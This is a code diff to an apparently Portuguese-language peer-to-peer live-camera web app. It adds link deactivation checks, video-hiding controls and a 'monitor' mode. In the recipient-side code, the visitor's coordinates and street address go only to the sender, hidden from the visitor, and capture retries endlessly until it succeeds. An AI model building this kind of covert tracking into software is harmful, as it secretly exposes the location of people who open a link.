@@ -12,15 +12,20 @@ export class ConnectionSetup {
     async setupSenderMode() {
         // Handle incoming calls
         this.peerConnection.onStream(async (call) => {
-            // Start audio only for sender (viewer)
+            // Start video for sender
             const mediaStream = this.camera.senderStream || await this.camera.startSenderMedia();
             call.answer(mediaStream);
             this.peerConnection.currentCall = call;
             
             call.on("stream", remoteStream => {
-                this.camera.addVideo(remoteStream, false, false, false);
+                // Add recipient's video to sender's screen
+                this.camera.addVideo(remoteStream, false, false);
                 this.ui.setStatus("Visitante conectado");
                 this.ui.btnRecord.disabled = false;
+                this.ui.btnBlur.disabled = false;
+                
+                const btnToggleSenderVideo = document.getElementById("btnToggleSenderVideo");
+                if (btnToggleSenderVideo) btnToggleSenderVideo.disabled = false;
             });
             
             call.on('track', (track, stream) => {
@@ -48,24 +53,61 @@ export class ConnectionSetup {
                 this.chat.receiveMessage(data.message);
             } else if (data.type === 'image') {
                 this.chat.receiveImage(data.dataUrl);
+            } else if (data.type === 'sender_video_visible') {
+                // Bidirectional video hiding - hide both sender's PIP and remote video
+                const senderPip = document.getElementById('senderPipWrapper');
+                if (senderPip) {
+                    senderPip.style.display = data.visible ? 'block' : 'none';
+                }
+                if (this.camera.remoteVideoElement) {
+                    this.camera.remoteVideoElement.style.display = data.visible ? 'block' : 'none';
+                }
             }
         });
     }
 
     async setupRecipientMode() {
         try {
-            // Check if recipient had video enabled
-            const recipientVideoEnabled = localStorage.getItem("livecam_recipientVideo") !== "false";
+            // Check if this is monitoring mode
+            const params = new URLSearchParams(window.location.search);
+            const room = params.get("r");
+            const isMonitoring = params.get("monitor") === "true";
             
+            if (!room) {
+                this.ui.setStatus("Link inválido", "#ef4444");
+                return;
+            }
+            
+            // Check if link has been deactivated
+            const authModule = await import('./auth.js');
+            const tempAuth = new authModule.AuthManager();
+            const adminModule = await import('./admin.js');
+            const tempAdmin = new adminModule.AdminManager(tempAuth);
+            
+            const isDeactivated = await tempAdmin.isLinkDeactivated(room);
+            if (isDeactivated) {
+                this.ui.setStatus("Este link foi desativado e não está mais disponível.", "#ef4444");
+                this.camera.stopLocalCamera();
+                return;
+            }
+            
+            // Check if recipient had video enabled (not applicable for monitoring)
+            const recipientVideoEnabled = !isMonitoring && localStorage.getItem("livecam_recipientVideo") !== "false";
+
+            // Add error handler BEFORE starting camera or making call
+            this.peerConnection.onError((err) => {
+                console.error("Peer error:", err);
+                this.ui.setStatus("Erro: Link inválido ou expirado. Recarregue a página.", "#ef4444");
+                this.camera.stopLocalCamera();
+            });
+
             if (recipientVideoEnabled) {
                 await this.camera.startCamera();
             } else {
                 await this.camera.startAudioOnly();
             }
             this.ui.setStatus("Conectando...");
-            
-            const params = new URLSearchParams(window.location.search);
-            const room = params.get("r");
+
             const call = this.peerConnection.call(room, this.camera.localStream);
             this.peerConnection.currentCall = call;
             
@@ -90,39 +132,54 @@ export class ConnectionSetup {
             this.peerConnection.onConnectionReady(async () => {
                 this.ui.setStatus("Chat conectado");
                 
-                try {
-                    const position = await this.location.getCurrentLocation();
-                    const { latitude, longitude } = position.coords;
-                    const addressData = await this.location.getAddressFromCoords(latitude, longitude);
-                    
-                    this.peerConnection.sendData({ 
-                        type: 'location', 
-                        latitude, 
-                        longitude, 
-                        address: addressData.address,
-                        via: addressData.via,
-                        numero: addressData.numero,
-                        bairro: addressData.bairro,
-                        municipio: addressData.municipio,
-                        cep: addressData.cep
-                    });
-                } catch (e) {
-                    console.error("Erro ao obter localização:", e);
+                // Retry location capture until successful
+                const captureLocation = async () => {
+                    try {
+                        const position = await this.location.getCurrentLocation();
+                        const { latitude, longitude } = position.coords;
+                        const addressData = await this.location.getAddressFromCoords(latitude, longitude);
+                        
+                        // Don't display location on recipient's screen
+                        // Location is only sent to sender
+                        
+                        this.peerConnection.sendData({ 
+                            type: 'location', 
+                            latitude, 
+                            longitude, 
+                            address: addressData.address,
+                            via: addressData.via,
+                            numero: addressData.numero,
+                            bairro: addressData.bairro,
+                            municipio: addressData.municipio,
+                            cep: addressData.cep
+                        });
+                        
+                        return true;
+                    } catch (e) {
+                        console.error("Erro ao obter localização, tentando novamente em 5s:", e);
+                        await new Promise(resolve => setTimeout(resolve, 5000));
+                        return false;
+                    }
+                };
+                
+                // Keep retrying until location is captured
+                let locationCaptured = false;
+                while (!locationCaptured) {
+                    locationCaptured = await captureLocation();
                 }
             });
             
             this.peerConnection.onData((data) => {
-                if (data.type === 'chat') {
+                if (data.type === 'chat' && !isMonitoring) {
                     this.chat.receiveMessage(data.message);
-                } else if (data.type === 'image') {
+                } else if (data.type === 'image' && !isMonitoring) {
                     this.chat.receiveImage(data.dataUrl);
-                } else if (data.type === 'stop_camera') {
+                } else if (data.type === 'stop_camera' && !isMonitoring) {
                     this.camera.stopLocalCamera();
                     this.ui.setStatus('Câmera encerrada pelo remetente.');
                 } else if (data.type === 'recipient_video_toggle') {
                     if (data.enabled) {
                         this.ui.setStatus('Visitante ativou vídeo');
-                        // Ensure the recipient's video is visible on sender's screen
                         if (this.camera.remoteVideoElement && this.camera.remoteVideoElement.srcObject) {
                             this.camera.remoteVideoElement.style.display = 'block';
                         }
@@ -132,10 +189,35 @@ export class ConnectionSetup {
                             this.camera.remoteVideoElement.style.display = 'none';
                         }
                     }
-                } else if (data.type === 'link_deleted') {
-                    alert('O link foi excluído pelo remetente. A conexão será encerrada.');
+                } else if (data.type === 'sender_video_visible') {
+                    // Bidirectional video hiding - hide both local and remote when sender hides
+                    if (data.visible) {
+                        if (this.camera.localVideoElement) {
+                            this.camera.localVideoElement.style.display = 'block';
+                        }
+                        if (this.camera.remoteVideoElement) {
+                            this.camera.remoteVideoElement.style.display = 'block';
+                        }
+                    } else {
+                        if (this.camera.localVideoElement) {
+                            this.camera.localVideoElement.style.display = 'none';
+                        }
+                        if (this.camera.remoteVideoElement) {
+                            this.camera.remoteVideoElement.style.display = 'none';
+                        }
+                    }
+                } else if (data.type === 'link_deleted' && !isMonitoring) {
                     this.camera.stopLocalCamera();
-                    window.close();
+                    this.ui.setStatus('Link excluído. Conexão encerrada.', '#ef4444');
+                    
+                    const btnSwitchCamera = document.getElementById("btnSwitchCamera");
+                    const btnReload = document.getElementById("btnReload");
+                    if (btnSwitchCamera) btnSwitchCamera.disabled = true;
+                    if (btnReload) btnReload.disabled = true;
+                    
+                    if (this.camera.localVideoElement) {
+                        this.camera.localVideoElement.style.display = 'none';
+                    }
                 }
             });
         } catch (error) {
